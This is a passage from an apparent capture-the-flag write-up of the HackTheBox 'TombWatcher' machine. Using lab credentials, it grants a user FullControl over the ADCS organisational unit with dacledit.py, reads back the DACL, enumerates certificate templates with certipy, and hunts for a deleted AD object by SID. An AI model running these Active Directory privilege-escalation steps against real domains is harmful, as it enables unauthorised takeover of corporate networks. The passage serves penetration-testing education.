 1 name to SID mappings.
 1 machine sid mappings.
 4 sid to domain mappings.
 0 global catalog mappings.
2025-06-10T09:11:47.0533218-04:00|INFORMATION|SharpHound Enumeration Completed at 9:11 AM on 6/10/2025! Happy Graphing!
```

```powershell
*Evil-WinRM* PS C:\Users\john\Documents> download 20250610091141_BloodHound.zip
                                        
Info: Downloading C:\Users\john\Documents\20250610091141_BloodHound.zip to 20250610091141_BloodHound.zip
                                        
Info: Download successful!
```

Let's ingest to bloodhound.

![Bloodhound](/assets/img/tombwatcher-htb-season8/tombwatcher-htb-season8_bloodhound_9.png)

New UI from bloodhound and the details is insane. <br>
Let's abuse to make `john` has full control over `ADCS` on the OU which inherit down to all objects.

```bash
└─$ dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=tombwatcher,DC=htb' 'tombwatcher.htb'/'john':'P@ssw4rd123' -dc-ip 10.129.xx.xx
/usr/local/bin/dacledit.py:99: SyntaxWarning: invalid escape sequence '\V'
  'S-1-5-83-0': 'NT VIRTUAL MACHINE\Virtual Machines',
/usr/local/bin/dacledit.py:108: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-554': 'BUILTIN\Pre-Windows 2000 Compatible Access',
/usr/local/bin/dacledit.py:109: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-555': 'BUILTIN\Remote Desktop Users',
/usr/local/bin/dacledit.py:110: SyntaxWarning: invalid escape sequence '\I'
  'S-1-5-32-557': 'BUILTIN\Incoming Forest Trust Builders',
/usr/local/bin/dacledit.py:112: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-558': 'BUILTIN\Performance Monitor Users',
/usr/local/bin/dacledit.py:113: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-559': 'BUILTIN\Performance Log Users',
/usr/local/bin/dacledit.py:114: SyntaxWarning: invalid escape sequence '\W'
  'S-1-5-32-560': 'BUILTIN\Windows Authorization Access Group',
/usr/local/bin/dacledit.py:115: SyntaxWarning: invalid escape sequence '\T'
  'S-1-5-32-561': 'BUILTIN\Terminal Server License Servers',
/usr/local/bin/dacledit.py:116: SyntaxWarning: invalid escape sequence '\D'
  'S-1-5-32-562': 'BUILTIN\Distributed COM Users',
/usr/local/bin/dacledit.py:117: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-569': 'BUILTIN\Cryptographic Operators',
/usr/local/bin/dacledit.py:118: SyntaxWarning: invalid escape sequence '\E'
  'S-1-5-32-573': 'BUILTIN\Event Log Readers',
/usr/local/bin/dacledit.py:119: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-574': 'BUILTIN\Certificate Service DCOM Access',
/usr/local/bin/dacledit.py:120: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-575': 'BUILTIN\RDS Remote Access Servers',
/usr/local/bin/dacledit.py:121: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-576': 'BUILTIN\RDS Endpoint Servers',
/usr/local/bin/dacledit.py:122: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-577': 'BUILTIN\RDS Management Servers',
/usr/local/bin/dacledit.py:123: SyntaxWarning: invalid escape sequence '\H'
  'S-1-5-32-578': 'BUILTIN\Hyper-V Administrators',
/usr/local/bin/dacledit.py:124: SyntaxWarning: invalid escape sequence '\A'
  'S-1-5-32-579': 'BUILTIN\Access Control Assistance Operators',
/usr/local/bin/dacledit.py:125: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-580': 'BUILTIN\Remote Management Users',
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250609-092009.bak
[*] DACL modified successfully!
```

To double check:
```bash
└─$ dacledit.py -action 'read' -target-dn 'OU=ADCS,DC=tombwatcher,DC=htb' 'tombwatcher.htb'/'john':'P@ssw4rd123' -dc-ip 10.129.xx.xx
/usr/local/bin/dacledit.py:99: SyntaxWarning: invalid escape sequence '\V'
  'S-1-5-83-0': 'NT VIRTUAL MACHINE\Virtual Machines',
/usr/local/bin/dacledit.py:108: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-554': 'BUILTIN\Pre-Windows 2000 Compatible Access',
/usr/local/bin/dacledit.py:109: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-555': 'BUILTIN\Remote Desktop Users',
/usr/local/bin/dacledit.py:110: SyntaxWarning: invalid escape sequence '\I'
  'S-1-5-32-557': 'BUILTIN\Incoming Forest Trust Builders',
/usr/local/bin/dacledit.py:112: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-558': 'BUILTIN\Performance Monitor Users',
/usr/local/bin/dacledit.py:113: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-559': 'BUILTIN\Performance Log Users',
/usr/local/bin/dacledit.py:114: SyntaxWarning: invalid escape sequence '\W'
  'S-1-5-32-560': 'BUILTIN\Windows Authorization Access Group',
/usr/local/bin/dacledit.py:115: SyntaxWarning: invalid escape sequence '\T'
  'S-1-5-32-561': 'BUILTIN\Terminal Server License Servers',
/usr/local/bin/dacledit.py:116: SyntaxWarning: invalid escape sequence '\D'
  'S-1-5-32-562': 'BUILTIN\Distributed COM Users',
/usr/local/bin/dacledit.py:117: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-569': 'BUILTIN\Cryptographic Operators',
/usr/local/bin/dacledit.py:118: SyntaxWarning: invalid escape sequence '\E'
  'S-1-5-32-573': 'BUILTIN\Event Log Readers',
/usr/local/bin/dacledit.py:119: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-574': 'BUILTIN\Certificate Service DCOM Access',
/usr/local/bin/dacledit.py:120: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-575': 'BUILTIN\RDS Remote Access Servers',
/usr/local/bin/dacledit.py:121: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-576': 'BUILTIN\RDS Endpoint Servers',
/usr/local/bin/dacledit.py:122: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-577': 'BUILTIN\RDS Management Servers',
/usr/local/bin/dacledit.py:123: SyntaxWarning: invalid escape sequence '\H'
  'S-1-5-32-578': 'BUILTIN\Hyper-V Administrators',
/usr/local/bin/dacledit.py:124: SyntaxWarning: invalid escape sequence '\A'
  'S-1-5-32-579': 'BUILTIN\Access Control Assistance Operators',
/usr/local/bin/dacledit.py:125: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-580': 'BUILTIN\Remote Management Users',
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Parsing DACL
[*] Printing parsed DACL
[*]   ACE[0] info                
[*]     ACE Type                  : ACCESS_DENIED_ACE
[*]     ACE flags                 : None
[*]     Access mask               : Delete, DeleteTree (0x10040)
[*]     Trustee (SID)             : Everyone (S-1-1-0)
[*]   ACE[1] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : CreateChild, DeleteChild
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : inetOrgPerson (4828cc14-1437-45bc-9b07-ad6f015e5f28)
[*]     Trustee (SID)             : Account Operators (S-1-5-32-548)
[*]   ACE[2] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : CreateChild, DeleteChild
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Computer (bf967a86-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : Account Operators (S-1-5-32-548)
[*]   ACE[3] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : CreateChild, DeleteChild
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Group (bf967a9c-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : Account Operators (S-1-5-32-548)
[*]   ACE[4] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : CreateChild, DeleteChild
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Print-Queue (bf967aa8-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : Print Operators (S-1-5-32-550)
[*]   ACE[5] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : CreateChild, DeleteChild
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : User (bf967aba-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : Account Operators (S-1-5-32-548)
[*]   ACE[6] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : None
[*]     Access mask               : FullControl (0xf01ff)
[*]     Trustee (SID)             : Domain Admins (S-1-5-21-1392491010-1358638721-2126982587-512)
[*]   ACE[7] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : None
[*]     Access mask               : FullControl (0xf01ff)
[*]     Trustee (SID)             : john (S-1-5-21-1392491010-1358638721-2126982587-1106)
[*]   ACE[8] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE
[*]     Access mask               : FullControl (0xf01ff)
[*]     Trustee (SID)             : john (S-1-5-21-1392491010-1358638721-2126982587-1106)
[*]   ACE[9] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, OBJECT_INHERIT_ACE
[*]     Access mask               : FullControl (0xf01ff)
[*]     Trustee (SID)             : john (S-1-5-21-1392491010-1358638721-2126982587-1106)
[*]   ACE[10] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : None
[*]     Access mask               : Read (0x20094)
[*]     Trustee (SID)             : Enterprise Domain Controllers (S-1-5-9)
[*]   ACE[11] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : None
[*]     Access mask               : Read (0x20094)
[*]     Trustee (SID)             : Authenticated Users (S-1-5-11)
[*]   ACE[12] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : None
[*]     Access mask               : FullControl (0xf01ff)
[*]     Trustee (SID)             : Local System (S-1-5-18)
[*]   ACE[13] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : User-Account-Restrictions (4c164200-20c0-11d0-a768-00aa006e0529)
[*]     Inherited type (GUID)     : inetOrgPerson (4828cc14-1437-45bc-9b07-ad6f015e5f28)
[*]     Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
[*]   ACE[14] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : User-Account-Restrictions (4c164200-20c0-11d0-a768-00aa006e0529)
[*]     Inherited type (GUID)     : User (bf967aba-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
[*]   ACE[15] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : User-Logon (5f202010-79a5-11d0-9020-00c04fc2d4cf)
[*]     Inherited type (GUID)     : inetOrgPerson (4828cc14-1437-45bc-9b07-ad6f015e5f28)
[*]     Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
[*]   ACE[16] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : User-Logon (5f202010-79a5-11d0-9020-00c04fc2d4cf)
[*]     Inherited type (GUID)     : User (bf967aba-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
[*]   ACE[17] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Membership (bc0ac240-79a9-11d0-9020-00c04fc2d4cf)
[*]     Inherited type (GUID)     : inetOrgPerson (4828cc14-1437-45bc-9b07-ad6f015e5f28)
[*]     Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
[*]   ACE[18] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Membership (bc0ac240-79a9-11d0-9020-00c04fc2d4cf)
[*]     Inherited type (GUID)     : User (bf967aba-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
[*]   ACE[19] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : General-Information (59ba2f42-79a2-11d0-9020-00c04fc2d3cf)
[*]     Inherited type (GUID)     : inetOrgPerson (4828cc14-1437-45bc-9b07-ad6f015e5f28)
[*]     Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
[*]   ACE[20] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : General-Information (59ba2f42-79a2-11d0-9020-00c04fc2d3cf)
[*]     Inherited type (GUID)     : User (bf967aba-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
[*]   ACE[21] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : RAS-Information (037088f8-0ae1-11d2-b422-00a0c968f939)
[*]     Inherited type (GUID)     : inetOrgPerson (4828cc14-1437-45bc-9b07-ad6f015e5f28)
[*]     Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
[*]   ACE[22] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : RAS-Information (037088f8-0ae1-11d2-b422-00a0c968f939)
[*]     Inherited type (GUID)     : User (bf967aba-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
[*]   ACE[23] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty, WriteProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : ms-DS-Key-Credential-Link (5b47d60f-6090-40b2-9f37-2a4de88f3063)
[*]     Trustee (SID)             : Key Admins (S-1-5-21-1392491010-1358638721-2126982587-526)
[*]   ACE[24] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty, WriteProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : ms-DS-Key-Credential-Link (5b47d60f-6090-40b2-9f37-2a4de88f3063)
[*]     Trustee (SID)             : Enterprise Key Admins (S-1-5-21-1392491010-1358638721-2126982587-527)
[*]   ACE[25] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Access mask               : Self
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : DS-Validated-Write-Computer (9b026da6-0d3c-465c-8bee-5199d7165cba)
[*]     Inherited type (GUID)     : Computer (bf967a86-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : Creator Owner (S-1-3-0)
[*]   ACE[26] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Access mask               : Self
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : DS-Validated-Write-Computer (9b026da6-0d3c-465c-8bee-5199d7165cba)
[*]     Inherited type (GUID)     : Computer (bf967a86-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : Principal Self (S-1-5-10)
[*]   ACE[27] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Token-Groups (b7c69e6d-2cc7-11d2-854e-00a0c983f608)
[*]     Inherited type (GUID)     : Computer (bf967a86-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : Enterprise Domain Controllers (S-1-5-9)
[*]   ACE[28] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Token-Groups (b7c69e6d-2cc7-11d2-854e-00a0c983f608)
[*]     Inherited type (GUID)     : Group (bf967a9c-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : Enterprise Domain Controllers (S-1-5-9)
[*]   ACE[29] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Token-Groups (b7c69e6d-2cc7-11d2-854e-00a0c983f608)
[*]     Inherited type (GUID)     : User (bf967aba-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : Enterprise Domain Controllers (S-1-5-9)
[*]   ACE[30] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Access mask               : WriteProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : ms-TPM-Tpm-Information-For-Computer (ea1b7b93-5e48-46d5-bc6c-4df4fda78a35)
[*]     Inherited type (GUID)     : Computer (bf967a86-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : Principal Self (S-1-5-10)
[*]   ACE[31] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Inherited type (GUID)     : inetOrgPerson (4828cc14-1437-45bc-9b07-ad6f015e5f28)
[*]     Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
[*]   ACE[32] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Inherited type (GUID)     : Group (bf967a9c-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
[*]   ACE[33] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Inherited type (GUID)     : User (bf967aba-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
[*]   ACE[34] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE, OBJECT_INHERIT_ACE
[*]     Access mask               : ReadProperty, WriteProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity (3f78c3e5-f79a-46bd-a0b8-9d18116ddc79)
[*]     Trustee (SID)             : Principal Self (S-1-5-10)
[*]   ACE[35] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
[*]     Access mask               : ControlAccess, ReadProperty, WriteProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Private-Information (91e647de-d96f-4b70-9557-d63ff4f3ccd8)
[*]     Trustee (SID)             : Principal Self (S-1-5-10)
[*]   ACE[36] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
[*]     Access mask               : FullControl (0xf01ff)
[*]     Trustee (SID)             : Enterprise Admins (S-1-5-21-1392491010-1358638721-2126982587-519)
[*]   ACE[37] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
[*]     Access mask               : ListChildObjects (0x4)
[*]     Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
[*]   ACE[38] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
[*]     Access mask               : ReadAndExecute (0xf01bd)
[*]     Trustee (SID)             : Administrators (S-1-5-32-544)
```

Run the `SharpHound.exe` again and put into bloodhound so there will be chance to find more related information. <br>
&rarr; Nothing special, let's try enumerate the `ADCS`.

### Active Directory Certificate Services (AD CS)
```bash
└─$ certipy find -u john -p P@ssw4rd123 -target tombwatcher.htb -text -stdout                                              
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The resolution lifetime expired after 5.402 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The resolution lifetime expired after 5.404 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates

...

17
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111

...
```

Hmm, these things make me curious. <br>
```bash
[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
```

See that this SID is belong to `Domain Admins` and `Enterprise Admins`. <br>
&rarr; Let's check this SID on bloodhound.

![Bloodhound](/assets/img/tombwatcher-htb-season8/tombwatcher-htb-season8_bloodhound_10.png)

Found out that this SID is enrolled to the `Web Server` template. <br>
&rarr; Need to find out the deleted object.

### Deleted AD Object
```powershell
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter "objectSid -eq 'S-1-5-21-1392491010-1358638721-2126982587-1111'" -IncludeDeletedObjects -Properties *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
